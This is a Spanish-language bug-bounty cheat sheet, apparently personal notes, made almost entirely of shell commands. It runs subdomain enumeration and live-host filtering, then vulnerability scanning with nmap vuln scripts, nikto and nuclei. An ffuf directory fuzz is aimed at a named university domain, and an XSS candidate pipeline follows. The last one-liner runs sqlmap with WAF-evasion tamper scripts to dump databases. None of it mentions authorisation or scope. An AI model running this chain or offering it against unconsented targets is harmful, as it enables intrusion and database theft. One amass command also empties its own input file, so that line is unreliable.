
----
- Tags: #bugbounty #reconocimiento 
----

### RECOPILACION SUBDOMINIOS

- Subfinder
```
subfinder -d domain.com -all  -o subfinder.txt                    
```

- Shodanx
```
shodanx subdomain -d domain.com -ra -o shodan.txt
```

- Amass
```
amass enum -active -norecursive -d domain.com -o amass.txt
cat amass.txt | grep -oP '\S+\.\S+\.\S+' | sort -u > amass.txt
```

- AlienVault
```
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/passive_dns" | jq -r '.passive_dns[]?.hostname' |  grep -E "^[a-zA-Z0-9.-]+\.domain.com$" | sort -u | tee alienvault_subs.txt
```

- UrlScan
```
curl -s "https://urlscan.io/api/v1/search/?q=domain:mydomain.com&size=10000" | jq -r '.results[]?.page?.domain' |  grep -E "^[a-zA-Z0-9.-]+\.mydomain\.com$" | sort -u | tee url_scan.txt
```

- WebArchive
```
curl -s 'http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=json&collapse=urlkey' | jq -r '.[1:][] | .[2]' | grep -Eo '([a-zA-Z0-9._-]+\.)?domain.com' | sort -u | tee web_archive.txt 
```

- JUNTAR SUBDOMINIOS
```
cat *.txt | anew sub.txt      
```

--------

### FILTER LIVE DOMAINS

- Httpx live
```
cat sub.txt | httpx -td -title -sc -ip > httpx_domain.com.txt
```

- LiveSubdomains
```
cat httpx_domain.com.txt | awk '{print $1}' > live_subdomains.txt
```

**RECOMENDABLE A PARTIR DE AQUI, BORRAR ARCHIVOS RESIDUO, MENOS** httpx_domain.com.txt y live_subdomains.txt

- Grep
```
cat live_subdomains.txt | grep -Ei 'asp|php|jsp|jspx|aspx'   
```

- Puerto Subdominios
```
httpx -l live_subdomains.txt -ports 80,443,8080,8443,8000,8888,8081,8181,3306,5432,6379,27017,15672,10000,9090,5900 -threads 60 -o sub-port.txt
```

- Scan Nmap
```
sudo nmap -sV -iL sub-port.txt -oN scaned-port.txt --script=vuln* 
```

- Nikto Scan
```
nikto -h live_subdomains.txt -output nikto_results.txt
```

- Nuclei
```
nuclei -l live_subdomains.txt -c 2 -rate-limit 10 -bulk-size 2 -severity critical,high,medium   
```

- Enumeracion directorios FFUF
```
ffuf -u https://www.itlalaguna.edu.mx/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -fc 403,404,500,400,502,503,429  
```

----

### Enumeracion JS



----

### Enumeracion XSS

- Recopilar posibles XSS
```
cat allurls.txt| gf xss | uro | Gxss | kxss | tee xss_output.txt                  
```

- Filtrar
```
cat xss_output.txt | sed -En 's/(.*\?\w+)=.*/\1=/p' | sort -u > final.txt
```




### ONELINERS CHIDITOS
```bash
echo "target.com" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.target.com.txt;sqlmap -m sqli.target.com.txt --risk=3 --level=3 --random-agent --technique=T --batch --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,space2comment,between  --dbs --dump
```